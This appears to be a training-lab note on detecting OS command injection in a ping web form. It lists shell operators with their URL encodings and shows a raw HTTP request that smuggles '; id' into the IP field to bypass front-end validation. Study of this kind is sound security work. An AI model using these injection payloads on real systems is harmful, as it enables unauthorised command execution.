# Detection

## Vulnerable Application

```text title="Enter an IP Address"
127.0.0.1
```

```output title="Output"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.028/0.028/0.028/0.000 ms
```

## Methods

| CHARACTER | ENCODED CHARACTER |
|---|---|
| ; | %3B |
| \n | %0A |
| & | %26 |
| && | %26%26 |
| &#124; | %7C |
| &#124;&#124; | %7C%7C |
| $() | %24%28%29 |

## Bypassing Front-End Validation

```http title="Request" hl_lines="16"
POST / HTTP/1.1
Host: 94.237.53.203:34224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://94.237.53.203:34224
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.53.203:34224/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1%3B+id
```
